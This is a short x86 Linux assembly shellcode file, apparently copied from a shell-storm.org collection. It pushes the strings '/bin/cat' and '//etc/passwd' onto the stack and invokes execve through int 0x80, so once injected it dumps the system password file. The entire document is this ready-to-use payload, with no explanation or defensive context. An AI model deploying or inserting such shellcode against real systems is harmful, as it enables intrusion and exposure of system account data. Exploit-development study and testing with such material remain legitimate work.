;http://shell-storm.org/shellcode/files/shellcode-571.php
global _start
section .text
_start:
cdq
push edx
push dword 0x7461632f
push dword 0x6e69622f
mov ebx,esp
push edx
push dword 0x64777373
push dword 0x61702f2f
push dword 0x6374652f
mov ecx,esp
mov al,0xb
push edx
push ecx
push ebx
mov ecx,esp
int 80h
